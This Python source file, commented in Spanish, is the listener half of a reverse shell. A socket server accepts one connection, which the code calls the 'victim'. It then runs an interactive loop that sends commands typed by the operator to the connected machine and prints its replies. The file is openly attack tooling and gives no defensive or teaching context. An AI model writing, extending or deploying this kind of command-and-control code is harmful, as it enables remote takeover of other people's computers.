import socket


class ClientCloseSocket(Exception):
    """Exception thrown when the client close the socket"""
    pass


class SocketServer:
    def __init__(self, direction, port, time_out_response, connect_time_out):
        self.ip_victim = None
        self.socket_victim = None
        self.direction = direction
        self.port = port
        self.recv_time_out = time_out_response
        self.connect_time_out = connect_time_out
        self.socket = socket.socket()

    def __recv_response_from_client__(self, convert: bool = True):
        self.socket_victim.settimeout(self.recv_time_out)
        response = self.socket_victim.recv(2048)
        if response != b"":
            return response.decode() if convert else response
        else:
            raise ClientCloseSocket()

    def run_server(self):
        self.socket.bind((self.direction, self.port))
        print("Se habilito la escucha del desde {} por el puerto:{}"
              .format(self.direction, self.port))
        print("Esperando conexiones...")
        self.socket.listen(1)
        if self.connect_time_out:
            self.socket.settimeout(self.connect_time_out)
        self.socket_victim, self.ip_victim = self.socket.accept()
        print("Conexión de {}".format(self.ip_victim))

    def enable_interactive_shell(self):
        print("Se habilito la shell interactiva con :{}".format(self.ip_victim))
        while True:
            command = input("{}@shell: ".format(self.ip_victim)).strip()
            if command != "":
                self.socket_victim.send(command.encode())
                response = self.__recv_response_from_client__().strip()
                print("{}:-> {}".format(self.ip_victim, response))

    def __del__(self):
        print("Limpiando conexiones del servidor")
        self.socket.close()
